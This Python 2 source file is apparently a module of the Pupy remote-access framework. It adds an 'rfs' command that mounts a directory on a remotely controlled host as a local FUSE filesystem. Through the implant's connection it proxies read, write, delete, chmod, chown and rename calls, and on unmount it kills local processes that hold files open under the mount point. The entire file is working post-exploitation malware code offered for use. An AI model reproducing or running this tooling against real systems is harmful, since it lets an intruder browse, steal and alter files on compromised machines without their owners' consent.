# -*- coding: utf-8 -*-

# https://raw.githubusercontent.com/skorokithakis/python-fuse-sample/master/passthrough.py

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser, IgnoreModule

import os
import errno
import subprocess

import threading
import psutil

try:
    import fuse
    from fuse import FuseOSError, Operations

except Exception, e:
    raise IgnoreModule(e)

class PupyFUSE(fuse.FUSE):
    ''' FUSE override SIGINT handler, which is bad. So ^C ^V without that '''

    def __init__(self, operations, mountpoint, raw_fi=False, encoding='utf-8',
                 **kwargs):

        '''
        Setting raw_fi to True will cause FUSE to pass the fuse_file_info
        class as is to Operations, instead of just the fh field.

        This gives you access to direct_io, keep_cache, etc.
        '''

        self.operations = operations
        self.raw_fi = raw_fi
        self.encoding = encoding

        args = ['fuse']

        args.extend(flag for arg, flag in self.OPTIONS
                    if kwargs.pop(arg, False))

        kwargs.setdefault('fsname', operations.__class__.__name__)
        args.append('-o')
        args.append(','.join(self._normalize_fuse_options(**kwargs)))
        args.append(mountpoint)

        args = [arg.encode(encoding) for arg in args]
        argv = (fuse.c_char_p * len(args))(*args)

        fuse_ops = fuse.fuse_operations()

        for field in fuse.fuse_operations._fields_:
            if len(field) == 3:
                continue

            name, prototype = field
            if prototype != fuse.c_voidp and getattr(operations, name, None):
                op = fuse.partial(self._wrapper, getattr(self, name))
                setattr(fuse_ops, name, prototype(op))

        self.args = args
        self.fuse_ops = fuse_ops
        self.argv = argv

    def loop(self):
        err = fuse._libfuse.fuse_main_real(
            len(self.args), self.argv,
            fuse.pointer(self.fuse_ops),
            fuse.sizeof(self.fuse_ops), None)

        del self.operations     # Invoke the destructor

        if err:
            raise RuntimeError(err)

class RFSManager(object):
    def __init__(self):
        self._mounts = {}
        self._conn = None
        self._pupsrv = None
        self._rops = None

    @property
    def assigned(self):
        return all([
            self._conn, self._pupsrv, self._rops
        ])

    def assign(self, client):
        self._conn = client.conn
        self._pupsrv = client.pupsrv

        opm_methos = ('join', 'sep', 'isdir', 'relpath')
        om_stat = ('statvfs', 'lstat')

        rops = RemoteOperations()
        for om in RemoteOperations.__slots__:
            if om in opm_methos or om in om_stat:
                continue

            setattr(rops, om, client.remote('os', om, False))

        for opm in opm_methos:
            setattr(rops, opm, client.remote('os.path', opm, False))

        for oms in om_stat:
            setattr(rops, oms, client.remote('pupyutils.basic_cmds', 'd'+oms))

        self._rops = rops

    def mount(self, rpath, lpath):

        lpath = os.path.expanduser(lpath)
        lpath = os.path.expandvars(lpath)
        lpath = os.path.abspath(lpath)

        if lpath in self._mounts:
            raise ValueError('{} already mounted'.format(lpath))

        self._mounts[lpath] = PupyFUSE(
            PupyRFS(rpath, self._rops), lpath,
            nothreads=True, foreground=True
        )

        self._mounts[lpath].cleanup = lambda: self.umount(lpath)

        self._mounts[lpath].thread = threading.Thread(target=self._mounts[lpath].loop)
        self._mounts[lpath].thread.daemon = True
        self._mounts[lpath].thread.start()

        self._conn.register_local_cleanup(self._mounts[lpath].cleanup)

    def umount(self, lpath):
        if lpath not in self._mounts:
            raise ValueError('Unregistered mount point {}'.format(lpath))

        for x in psutil.process_iter(['open_files']):
            try:
                pid, dirs = x.pid, set([
                    os.path.abspath(y.path) for y in x.open_files()
                ])

                for d in dirs:
                    if d == lpath or d.startswith(lpath+'/'):
                        x.kill(pid)
                        break

            except psutil.AccessDenied:
                pass

        subprocess.check_call(['/usr/bin/fusermount', '-u', lpath])

        self._conn.unregister_local_cleanup(self._mounts[lpath].cleanup)
        del self._mounts[lpath]

    @property
    def mounts(self):
        return {
            x:y.operations.root for x,y in self._mounts.iteritems()
        }

    def umountall(self):
        for lpath in self._mounts.keys():
            self.umount(lpath)

class RemoteOperations(object):
    __slots__ = (
        'join',
        'sep',
        'isdir',
        'relpath',

        'access',
        'chmod',
        'chown',
        'lstat',
        'listdir',
        'readlink',
        'mknod',
        'rmdir',
        'mkdir',
        'statvfs',
        'unlink',
        'symlink',
        'rename',
        'link',
        'utime',

        'open',
        'read',
        'lseek',
        'write',
        'ftruncate',
        'fsync',
        'close'
    )

class PupyRFS(Operations):
    def __init__(self, root, rops):
        self.root = root
        self.rops = rops

    # Helpers
    # =======

    def _full_path(self, partial):
        return self.root + self.rops.sep + self.rops.sep.join(
            x for x in os.path.split(partial) if x
        ).decode('utf-8')

    # Filesystem methods
    # ==================

    def access(self, path, mode):
        full_path = self._full_path(path)
        if not self.rops.access(full_path, mode):
            raise FuseOSError(errno.EACCES)

    def chmod(self, path, mode):
        full_path = self._full_path(path)
        return self.rops.chmod(full_path, mode)

    def chown(self, path, uid, gid):
        full_path = self._full_path(path)
        return self.rops.chown(full_path, uid, gid)

    def getattr(self, path, fh=None):
        full_path = self._full_path(path)
        st = self.rops.lstat(full_path)

        return dict((key, st.get(key)) for key in (
            'st_atime', 'st_ctime',
            'st_gid', 'st_mode', 'st_mtime', 'st_nlink',
            'st_size', 'st_uid'))

    def readdir(self, path, fh):
        full_path = self._full_path(path)

        dirents = [u'.', u'..']

        if self.rops.isdir(full_path):
            dirents.extend(self.rops.listdir(full_path))

        for r in dirents:
            yield r

    def readlink(self, path):
        pathname = self.rops.readlink(self._full_path(path))
        if pathname.startswith("/"):
            # Path name is absolute, sanitize it.
            return self.rops.relpath(pathname, self.root)
        else:
            return pathname

    def mknod(self, path, mode, dev):
        return self.rops.mknod(self._full_path(path), mode, dev)

    def rmdir(self, path):
        full_path = self._full_path(path)
        return self.rops.rmdir(full_path)

    def mkdir(self, path, mode):
        return self.rops.mkdir(self._full_path(path), mode)

    def statfs(self, path):
        full_path = self._full_path(path)
        stv = self.rops.statvfs(full_path)
        return dict((key, stv.get(key)) for key in (
            'f_bavail', 'f_bfree',
            'f_blocks', 'f_bsize', 'f_favail',
            'f_ffree', 'f_files', 'f_flag',
            'f_frsize', 'f_namemax'))

    def unlink(self, path):
        return self.rops.unlink(self._full_path(path))

    def symlink(self, name, target):
        return self.rops.symlink(target, self._full_path(name))

    def rename(self, old, new):
        return self.rops.rename(self._full_path(old), self._full_path(new))

    def link(self, target, name):
        return self.rops.link(self._full_path(name), self._full_path(target))

    def utimens(self, path, times=None):
        return self.rops.utime(self._full_path(path), times)

    # File methods
    # ============

    def open(self, path, flags):
        full_path = self._full_path(path)
        return self.rops.open(full_path, flags)

    def create(self, path, mode, fi=None):
        full_path = self._full_path(path)
        return self.rops.open(full_path, os.O_WRONLY | os.O_CREAT, mode)

    def read(self, path, length, offset, fh):
        self.rops.lseek(fh, offset, os.SEEK_SET)
        return self.rops.read(fh, length)

    def write(self, path, buf, offset, fh):
        self.rops.lseek(fh, offset, os.SEEK_SET)
        return self.rops.write(fh, buf)

    def truncate(self, path, length, fh=None):
        full_path = self._full_path(path)
        fd = self.rops.open(full_path, os.O_RDWR)
        if fd != -1:
            self.rops.ftruncate(fd, length)
            self.rops.close(fd)

    def flush(self, path, fh):
        return self.rops.fsync(fh)

    def release(self, path, fh):
        return self.rops.close(fh)

    def fsync(self, path, fdatasync, fh):
        return self.flush(path, fh)

__class_name__ = 'RemoteFS'

@config(cat="admin")
class RemoteFS(PupyModule):
    ''' Mount remote FS as Fuse FS to mountpoint '''

    dependencies = ['pupyutils.basic_cmds']

    @classmethod
    def init_argparse(cls):
        parser = PupyArgumentParser(prog='rfs', description=cls.__doc__)
        commands = parser.add_subparsers(dest='command')

        mount = commands.add_parser('mount')
        mount.add_argument('src', help='Remote directory')
        mount.add_argument('dest', help='Local mount point')
        mount.set_defaults(func=cls.mount)

        umount = commands.add_parser('umount')
        umount.add_argument('dest', help='Local mount point')
        umount.set_defaults(func=cls.umount)

        mlist = commands.add_parser('list')
        mlist.set_defaults(func=cls.list)

        cls.arg_parser = parser

    def run(self, args):
        manager = self.client.conn.single(RFSManager)
        if not manager.assigned:
            manager.assign(self.client)

        args.func(self, args, manager)

    def mount(self, args, manager):
        manager.mount(args.src, args.dest)

    def umount(self, args, manager):
        manager.umount(args.dest)

    def list(self, args, manager):
        for src,dst in manager.mounts.iteritems():
            self.info('{} -> {}'.format(src, dst))
